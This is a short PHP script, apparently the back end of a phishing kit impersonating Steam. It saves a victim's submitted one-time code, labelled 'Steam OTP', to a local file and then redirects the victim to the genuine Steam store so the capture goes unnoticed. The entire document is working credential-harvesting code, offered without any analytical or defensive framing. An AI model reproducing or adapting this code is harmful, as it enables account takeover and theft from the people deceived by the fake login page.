<?php
file_put_contents("otp.txt", "Steam OTP : " . $email = $_POST['username'] . "\n", FILE_APPEND);
header('Location: https://store.steampowered.com/');
?>
